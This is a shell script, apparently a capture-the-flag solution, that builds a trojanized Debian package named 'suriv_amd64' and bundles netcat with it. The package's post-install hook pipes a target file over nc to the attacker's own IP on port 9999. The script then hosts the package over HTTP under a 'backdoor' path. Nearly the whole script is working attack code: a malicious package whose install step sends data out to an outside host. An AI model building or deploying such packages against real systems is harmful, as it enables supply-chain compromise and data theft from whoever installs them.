#!/bin/sh
# Run this script in the guest home directory. It will perform the following steps:
# 1. Create the folder structure
# 2. Extract and copy netcat into the package's folder structure
# 3. Create and fill the Debian package's control file
# 4. Create and fill the post-installation script
#    NOTE: Since our IP address may change between terminal resets, it is determined upon the
#          creation of the postinst script, rather than being hard-coded
# 5. Build the suriv_amd64.deb package
# 6. Host the package

# Prepare the folder structure under a new server_root-folder. Since the requested path is
# /pub/jfrost/backdoor, this is where our package should end up.
mkdir -p server_root/pub/jfrost/backdoor
cd server_root/pub/jfrost/backdoor
mkdir -p suriv_amd64/DEBIAN
mkdir -p suriv_amd64/usr/bin/

# Extract and copy the netcat executable from the netcat debian package so we can ship it with
# our custom package. Target location is /<package_dir>/usr/bin/ so the executable will end up
# in the /usr/bin folder on the target machine
dpkg-deb --extract ~/debs/netcat-traditional_1.10-41.1ubuntu1_amd64.deb ~/debs/nc
cp ~/debs/nc/bin/nc.traditional suriv_amd64/usr/bin/nc

# Construct the control-file
echo 'Package: surivamd64' >> ./suriv_amd64/DEBIAN/control
echo 'Version: 1.0' >> ./suriv_amd64/DEBIAN/control
echo 'Maintainer: Heras' >> ./suriv_amd64/DEBIAN/control
echo 'Architecture: all' >> ./suriv_amd64/DEBIAN/control
echo 'Description: bye Jack' >> ./suriv_amd64/DEBIAN/control

# Determine our own IP address
ip4=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)

# Construct the postinst script that runs post-install and point the payload to contact our machine on port 9999
echo '#!/bin/sh' > ./suriv_amd64/DEBIAN/postinst
echo "cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt| /usr/bin/nc ${ip4} 9999" >> ./suriv_amd64/DEBIAN/postinst
chmod +x ./suriv_amd64/DEBIAN/postinst

# Build the ebian package
dpkg-deb --build suriv_amd64

# Host the package
cd ../../../
python3 -m http.server 80
